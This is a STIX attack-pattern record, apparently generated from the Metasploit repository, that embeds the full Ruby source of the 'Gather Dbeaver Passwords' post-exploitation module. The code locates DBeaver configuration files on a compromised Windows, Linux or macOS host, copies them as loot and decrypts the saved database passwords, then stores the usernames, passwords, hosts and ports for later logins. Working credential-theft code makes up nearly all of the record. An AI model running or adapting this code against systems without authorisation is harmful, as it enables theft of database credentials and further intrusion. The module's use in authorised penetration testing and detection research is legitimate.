{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8bdb9012-3cee-47e9-af73-da3595d55787",
    "created": "2024-08-14T16:33:19.185659Z",
    "modified": "2024-08-14T16:33:19.185663Z",
    "name": "Gather Dbeaver Passwords",
    "description": " This module will determine if Dbeaver is installed on the target system and, if it is, it will try to dump all saved session information from the target. The passwords for these saved sessions will then be decrypted where possible.  'License' => MSF_LICENSE 'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/dbeaver.rb",
            "external_id": "dbeaver.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Rex::Parser::Dbeaver\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Gather Dbeaver Passwords',\n        'Description' => %q{\n          This module will determine if Dbeaver is installed on the target system and, if it is, it will try to\n          dump all saved session information from the target. The passwords for these saved sessions will then be decrypted\n          where possible.\n        },\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'https://blog.kali-team.cn/Metasploit-dbeaver-9f42e26241c94ba785dce5f1e69697aa' ]\n        ],\n        'Author' => ['Kali-Team <kali-team[at]qq.com>'],\n        'Platform' => [ 'linux', 'win', 'osx', 'unix'],\n        'SessionTypes' => [ 'meterpreter', 'shell', 'powershell' ],\n        'Notes' => {\n          'Stability' => [],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('XML_FILE_PATH', [ false, 'Specifies the .dbeaver-data-sources.xml file path for Dbeaver']),\n        OptString.new('JSON_DIR_PATH', [ false, 'Specifies the json directory path for Dbeaver']),\n      ]\n    )\n  end\n\n  def print_and_save(all_result)\n    pw_tbl = Rex::Text::Table.new(\n      'Header' => 'Dbeaver Password',\n      'Columns' => [\n        'Name',\n        'Protocol',\n        'Hostname',\n        'Port',\n        'Username',\n        'Password',\n        'DB',\n        'URI',\n        'Type',\n      ]\n    )\n    all_result.each do |item|\n      item.each do |_key, value|\n        pw_tbl << value.values\n        next if value['user'].empty? && value['password'].empty?\n\n        config = {\n          type: value['provider'],\n          host: value['host'],\n          port: value['port'],\n          username: value['user'],\n          password: value['password']\n        }\n        dbeaver_store_config(config)\n      end\n    end\n    if pw_tbl.rows.count > 0\n      path = store_loot('host.dbeaver', 'text/plain', session, pw_tbl, 'dbeaver.txt', 'Dbeaver Password')\n      print_good(\"Passwords stored in: #{path}\")\n      print_good(pw_tbl.to_s)\n    end\n  end\n\n  def dbeaver_store_config(config)\n    service_data = {\n      address: config[:host],\n      port: config[:port],\n      service_name: config[:type],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :session,\n      session_id: session_db_id,\n      post_reference_name: refname,\n      private_type: :password,\n      private_data: config[:password],\n      username: config[:username]\n    }.merge(service_data)\n\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def parse_json_dir(json_dir)\n    some_result = []\n    credentials_config = File.join(json_dir, 'credentials-config.json')\n    data_sources = File.join(json_dir, 'data-sources.json')\n    if session.platform == 'windows'\n      credentials_config.gsub!('/') { '\\\\' }\n      data_sources.gsub!('/') { '\\\\' }\n    end\n    begin\n      if file_exist?(credentials_config) && file_exist?(data_sources)\n        credentials_config_data = read_file(credentials_config) || ''\n        data_sources_data = read_file(data_sources) || ''\n        print_error('The file could not be read') if data_sources_data.empty? || credentials_config_data.empty?\n        credentials_config_loot_path = store_loot('dbeaver.creds', 'text/json', session, credentials_config_data, credentials_config)\n        data_sources_loot_path = store_loot('dbeaver.creds', 'text/json', session, data_sources_data, data_sources)\n        print_good(\"dbeaver credentials-config.json saved to #{credentials_config_loot_path}\")\n        print_good(\"dbeaver data-sources.json saved to #{data_sources_loot_path}\")\n        some_result << parse_data_sources(data_sources_data, credentials_config_data)\n        print_status(\"Finished processing #{json_dir}\")\n      end\n    rescue Rex::Parser::Dbeaver::Error::DbeaverError => e\n      print_error(\"Error when parsing #{data_sources} and #{credentials_config}: #{e}\")\n    end\n    return some_result\n  end\n\n  def parse_xml_file(fullpath)\n    some_result = []\n    begin\n      if file_exist?(fullpath)\n        file_data = read_file(fullpath) || ''\n        print_error(\"The file #{fullpath} could not be read\") if file_data.empty?\n        loot_path = store_loot('dbeaver.creds', 'text/xml', session, file_data, fullpath)\n        print_good(\"dbeaver .dbeaver-data-sources.xml saved to #{loot_path}\")\n        result = parse_data_sources_xml(file_data)\n        if !result.empty?\n          some_result << result\n        end\n        print_status(\"Finished processing #{fullpath}\")\n      end\n    rescue Rex::Parser::Dbeaver::Error::DbeaverError => e\n      print_error(\"Error when parsing #{fullpath}: #{e}\")\n    end\n    return some_result\n  end\n\n  def get_path\n    path_hash = Hash.new\n    xml_paths = []\n    case session.platform\n    when 'windows'\n      app_data = get_env('AppData')\n      if app_data.present?\n        xml_paths.push(app_data + '\\DBeaverData\\workspace6\\General\\.dbeaver-data-sources.xml')\n        path_hash['json'] = app_data + '\\DBeaverData\\workspace6\\General\\.dbeaver'\n      end\n      home = get_env('USERPROFILE')\n      if home.present?\n        xml_paths.push(home + '\\.dbeaver4\\General\\.dbeaver-data-sources.xml')\n      end\n    when 'linux', 'osx', 'unix'\n      home = get_env('HOME')\n      if home.present?\n        xml_paths.push(home + '/.dbeaver4/General/.dbeaver-data-sources.xml')\n        xml_paths.push(home + '/.local/share/DBeaverData/workspace6/General/.dbeaver-data-sources.xml')\n        path_hash['json'] = home + '/.local/share/DBeaverData/workspace6/General/.dbeaver'\n      end\n    end\n    path_hash['xml'] = xml_paths\n    return path_hash\n  end\n\n  def run\n    print_status('Gather Dbeaver Passwords')\n    all_result = []\n    xml_path = ''\n    json_path = ''\n    if datastore['XML_FILE_PATH'].present?\n      xml_path = datastore['XML_FILE_PATH']\n      print_status(\"Looking for #{xml_path}\")\n      all_result += parse_xml_file(xml_path)\n    end\n    if datastore['JSON_DIR_PATH'].present?\n      json_path = datastore['JSON_DIR_PATH']\n      print_status(\"Looking for JSON files in #{json_path}\")\n      all_result += parse_json_dir(json_path)\n    end\n    if xml_path.empty? && json_path.empty?\n      path_hash = get_path\n      xml_paths = path_hash['xml'] || []\n      xml_paths.each do |path|\n        result = parse_xml_file(path)\n        if !result.empty?\n          all_result += result\n        end\n      end\n      if !path_hash['json'].blank?\n        result = parse_json_dir(path_hash['json'])\n        if !result.empty?\n          all_result += result\n        end\n      end\n    end\n    print_and_save(all_result)\n  end\nend\n",
    "x_mitre_contributors": [
        "[Kali-Team <kali-team[at]qq.com>]",
        ""
    ],
    "x_mitre_platforms": [
        "[ 'linux', 'win', 'osx', 'unix']"
    ]
}